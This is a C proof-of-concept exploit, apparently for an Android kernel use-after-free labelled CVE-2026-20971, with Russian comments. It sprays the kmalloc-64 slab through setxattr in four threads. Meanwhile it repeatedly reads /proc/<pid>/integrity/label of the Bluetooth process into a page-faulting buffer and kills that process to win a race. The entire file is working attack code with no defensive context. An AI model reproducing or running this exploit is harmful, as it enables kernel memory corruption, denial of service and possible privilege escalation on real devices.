#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <sys/wait.h>
#include <errno.h>

int find_pid(const char *name) {
    DIR *dir = opendir("/proc");
    struct dirent *entry;
    int pid = -1;
    if (!dir) return -1;
    
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            int id = atoi(entry->d_name);
            if (id > 0) {
                char path[256], cmdline[128];
                snprintf(path, sizeof(path), "/proc/%d/cmdline", id);
                int fd = open(path, O_RDONLY);
                if (fd >= 0) {
                    int n = read(fd, cmdline, sizeof(cmdline)-1);
                    close(fd);
                    if (n > 0) {
                        cmdline[n] = '\0';
                        if (strstr(cmdline, name) != NULL) {
                            pid = id;
                            break;
                        }
                    }
                }
            }
        }
    }
    closedir(dir);
    return pid;
}

void* spray_thread(void* arg) {
    char value[56]; // Идеальный размер для kmalloc-64
    memset(value, 0xFF, sizeof(value)); 
    char path[64];
    snprintf(path, sizeof(path), "/data/local/tmp/spray_%d", gettid());
    int fd = open(path, O_CREAT | O_RDWR, 0600);
    if (fd >= 0) close(fd);

    long count = 0;
    while(1) {
        char name[64];
        snprintf(name, sizeof(name), "user.spray_%ld", count++);
        setxattr(path, name, value, sizeof(value), 0);
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    printf("[*] CVE-2026-20971 FIVE Label UAF PoC v7 (Kill)\n");

    // Запускаем 4 потока спрея, чтобы постоянно держать kmalloc-64 заполненным
    for (int i=0; i<4; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_thread, NULL);
        pthread_detach(tid);
    }

    // Выделяем страницу под чтение (page fault)
    char *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    long iterations = 0;

    while (1) {
        int pid = find_pid("com.android.bluetooth");
        if (pid == -1) {
            usleep(1000); // Ждем 1 мс, пока система его перезапустит
            continue;
        }

        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/integrity/label", pid);

        madvise(buf, 4096, MADV_DONTNEED);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            // Читаем label. Ядро берет указатель, но мы заставляем его уснуть на page fault
            read(fd, buf, 4096); 
            close(fd);
        }

        // Убиваем процесс (мгновенно)
        int ret = kill(pid, SIGKILL);
        if (ret < 0 && errno != ESRCH) {
            printf("[-] Kill failed: %s\n", strerror(errno));
            usleep(100000); // Если не можем убить, спим
        }
        
        iterations++;
        if (iterations % 1000 == 0) {
            printf("[*] Iterations: %ld\n", iterations);
        }
    }
    return 0;
}